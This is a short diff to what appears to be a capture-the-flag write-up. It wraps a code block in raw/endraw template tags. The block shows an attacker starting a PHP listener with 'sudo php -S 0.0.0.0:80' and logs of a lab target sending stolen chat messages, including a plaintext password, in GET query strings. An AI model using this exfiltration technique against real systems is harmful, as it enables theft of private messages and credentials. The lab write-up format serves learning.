@@ -1056,6 +1056,7 @@ sudo php -S 0.0.0.0:80
 
 And, finally, we get some messages sent through the chat
 
+{% raw %}
 ```bash
 ❯ sudo php -S 0.0.0.0:80
 [Tue Jul  8 19:39:32 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started
@@ -1072,6 +1073,7 @@ And, finally, we get some messages sent through the chat
 [Tue Jul  8 19:39:53 2025] 10.10.10.232:22012 [404]: GET /?x={%22sender_id%22:2,%22content%22:%22Hello%20David,%20I%27ve%20added%20a%20user%20account%20for%20you%20with%20the%20password%20`NWBFcSe3ws4VDhTB`.%22,%22roomId%22:2,%22_id%22:243} - No such file or directory
 [Tue Jul  8 19:39:53 2025] 10.10.10.232:22012 Closing
 ```
+{% endraw %}
 
 If we decode the last one, we can clearly see the best message we could get.
 
